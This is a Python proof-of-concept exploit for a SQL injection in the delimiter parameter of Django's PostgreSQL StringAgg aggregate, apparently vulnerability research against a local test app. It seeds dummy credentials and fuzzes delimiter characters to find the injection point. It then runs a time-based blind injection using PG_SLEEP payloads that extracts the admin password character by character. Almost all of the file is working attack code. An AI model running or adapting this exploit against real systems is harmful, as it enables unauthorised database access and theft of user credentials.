# encoding:utf-8
import os
import django
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "sqlvul_project.settings")
import signal
from contextlib import contextmanager

class TimeoutException(Exception): pass

@contextmanager
def time_limit(seconds):
    def signal_handler(signum, frame):
        raise TimeoutException("Timed out!")
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)




# Django 版本大于等于1.7的时候，需要加上下面两句
if django.VERSION >= (1, 7):#自动判断版本
    django.setup()

from vul_app.models import Info
from vul_app.models import Credential
from django.contrib.postgres.aggregates import StringAgg
from django.db.models import Count

"""
postgres 预先执行的SQL
CREATE DATABASE test;
\c test;
\d 列出当前数据库的所有表格
"""

def initdb():
    data = [('li','male'),('zhao','male'),('zhang','female')]
    for name,gender in data:
        Info.objects.get_or_create(name=name,gender=gender)
    data = [('admin','mypassword123'),('user1','user1password')]
    for username,password in data:
        Credential.objects.get_or_create(username=username,password=password)

def query():
    # FUZZ delimiter
    error_c = []
    other_error_c = []
    for c in "!@#$%^&*()_+=-|\\\"':;?/>.<,{}[]":
        results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name',delimiter=c))
        try:
            for e in results:
                pass
        except IndexError:
            error_c.append(c)
        except:
            other_error_c.append(c)
    print(error_c)
    print(other_error_c)
    return other_error_c

def query_with_evil():
    print("[+]正常的输出：")
    payload = '-'
    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=payload))
    for e in results:
        print(e)
    print("[+]注入后的的输出：")
    payload = '-\') AS "mydefinedname" FROM "vul_app_info" GROUP BY "vul_app_info"."gender" LIMIT 1 OFFSET 1 -- '
    payload = '-\') AS "mydefinedname" FROM "vul_app_info" GROUP BY "vul_app_info"."gender"; SELECT CASE WHEN (SELECT (SUBSTR(vul_app_credential.password,1,1)) FROM vul_app_credential where vul_app_credential.username=$$admin$$)= $$m$$ THEN PG_SLEEP (5) ELSE PG_SLEEP(0) END --'
    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=payload))
    for e in results:
        print(e)

def sql_injection(username='admin'):
    standard_payload = '-\') AS "mydefinedname" FROM "vul_app_info" GROUP BY "vul_app_info"."gender"; SELECT CASE WHEN (SELECT (SUBSTR(vul_app_credential.password,[index],1)) FROM vul_app_credential where vul_app_credential.username=$$%s$$)= $$[char]$$ THEN PG_SLEEP (5) ELSE PG_SLEEP(0) END -- '%username
    printable = '0123456789abcdefghijklmnopqrstuvwxyz'
    result = ''
    for i in range(1,100):
        payload2 = standard_payload.replace('[index]',str(i))
        for j in printable: 
            #print(j)
            payload = payload2.replace('[char]',str(j))
            try:
                with time_limit(1):
                    
                    #print(payload)
                    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=payload))
                    for e in results:
                        print(e)
            except TimeoutException as e:
                result += j
                print("Current password: ", result)
                break
            except:
                pass
        if j == 'z':
            break
    print("Finally, the password is: ", result)
 

if __name__ == '__main__':
    print("current version: ")
    print(django.VERSION) # test in 3.0.2
    initdb()
   
    if query():
        print("Injection point detected. Server vulnerable!")
        sql_injection('admin')  #can replace admin with user1
    else:
        print("Server not vulenrable.")
